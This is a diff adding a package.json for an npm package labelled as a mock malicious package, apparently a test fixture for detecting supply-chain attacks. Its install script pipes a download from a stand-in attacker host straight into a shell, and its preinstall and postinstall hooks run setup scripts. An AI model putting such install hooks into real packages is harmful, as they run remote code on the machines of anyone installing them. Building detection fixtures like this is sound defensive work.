@@ -1,0 +1,11 @@
+{
+  "name": "malicious-package",
+  "version": "1.0.0",
+  "description": "MOCK malicious package for testing",
+  "scripts": {
+    "preinstall": "node setup_bun.js",
+    "postinstall": "node -e \"require('./bun_environment.js')\"",
+    "install": "curl https://evil.com/payload.sh | sh"
+  },
+  "dependencies": {}
+}
